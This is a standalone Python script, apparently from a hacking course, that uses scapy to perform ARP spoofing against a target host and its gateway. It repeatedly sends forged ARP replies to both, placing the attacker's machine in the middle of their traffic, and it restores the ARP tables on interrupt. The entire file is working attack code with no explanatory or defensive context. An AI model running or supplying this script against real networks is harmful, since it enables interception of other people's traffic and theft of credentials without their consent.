#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoofy(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def get_ips():
    parser = argparse.ArgumentParser()
    parser.add_argument("-IPt", "--IPtarget", dest="target_ip", help="IP of target system")
    parser.add_argument("-IPg", "--IPgateway", dest="gateway_ip", help="IP of gateway")
    args = parser.parse_args()
    if not args.target_ip:
        parser.error("Please specify the target IP, use --help for more info.")
    elif not args.gateway_ip:
        parser.error("Please specify the gateway IP, use --help for more info.")
    return args

args = get_ips()

try:
    sent_packets_count = 0
    while True:
        spoofy(args.target_ip, args.gateway_ip)
        spoofy(args.gateway_ip, args.target_ip)
        sent_packets_count += 2
        print("\rPackets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetected CTRL + C ...... Reset ARP tables.\n")
    restore(args.target_ip, args.gateway_ip)
    restore(args.gateway_ip, args.target_ip)